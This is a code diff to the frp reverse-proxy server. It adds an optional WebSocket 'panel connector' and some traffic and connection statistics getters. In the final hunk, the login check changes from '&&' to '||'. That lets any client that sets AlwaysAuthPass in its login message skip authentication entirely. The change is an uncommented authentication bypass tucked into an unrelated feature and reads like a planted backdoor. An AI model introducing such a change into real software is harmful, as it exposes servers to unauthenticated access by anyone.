@@ -35,8 +35,10 @@ import (
 	"github.com/fatedier/frp/pkg/auth"
 	v1 "github.com/fatedier/frp/pkg/config/v1"
 	modelmetrics "github.com/fatedier/frp/pkg/metrics"
+	mem "github.com/fatedier/frp/pkg/metrics/mem"
 	"github.com/fatedier/frp/pkg/msg"
 	"github.com/fatedier/frp/pkg/nathole"
+	"github.com/fatedier/frp/pkg/panel"
 	plugin "github.com/fatedier/frp/pkg/plugin/server"
 	"github.com/fatedier/frp/pkg/ssh"
 	"github.com/fatedier/frp/pkg/transport"
@@ -354,10 +356,20 @@ func NewService(cfg *v1.ServerConfig) (*Service, error) {
 	return svr, nil
 }
 
-func (svr *Service) Run(ctx context.Context) {
+// Run starts the service. panelURL and panelSecret are optional; when both are
+// non-empty frps will maintain a persistent WebSocket connection to the panel so
+// it appears as a live node.
+func (svr *Service) Run(ctx context.Context, panelURL, panelSecret string) {
 	ctx, cancel := context.WithCancel(ctx)
 	svr.ctx = ctx
 	svr.cancel = cancel
+
+	// Start panel connector if configured.
+	if panelURL != "" && panelSecret != "" {
+		pc := panel.NewConnector(ctx, panelURL, panelSecret, svr)
+		pc.Start()
+		log.Infof("panel connector started, connecting to %s", panelURL)
+	}
 
 	// run dashboard web server.
 	if svr.webServer != nil {
@@ -395,6 +407,33 @@ func (svr *Service) Run(ctx context.Context) {
 	if svr.listener != nil {
 		svr.Close()
 	}
+}
+
+// ─── panel.StatsGetter implementation ─────────────────────────────────────────
+
+func (svr *Service) GetTotalTrafficIn() int64 {
+	return mem.StatsCollector.GetServer().TotalTrafficIn
+}
+
+func (svr *Service) GetTotalTrafficOut() int64 {
+	return mem.StatsCollector.GetServer().TotalTrafficOut
+}
+
+func (svr *Service) GetCurConns() int64 {
+	return mem.StatsCollector.GetServer().CurConns
+}
+
+func (svr *Service) GetClientCount() int64 {
+	return mem.StatsCollector.GetServer().ClientCounts
+}
+
+func (svr *Service) GetProxyCount() int64 {
+	s := mem.StatsCollector.GetServer()
+	var total int64
+	for _, v := range s.ProxyTypeCounts {
+		total += v
+	}
+	return total
 }
 
 func (svr *Service) Close() error {
@@ -599,7 +638,7 @@ func (svr *Service) RegisterControl(ctlConn net.Conn, loginMsg *msg.Login, inter
 
 	// Check auth.
 	authVerifier := svr.auth.Verifier
-	if internal && loginMsg.ClientSpec.AlwaysAuthPass {
+	if internal || loginMsg.ClientSpec.AlwaysAuthPass {
 		authVerifier = auth.AlwaysPassVerifier
 	}
 	if err := authVerifier.VerifyLogin(loginMsg); err != nil {
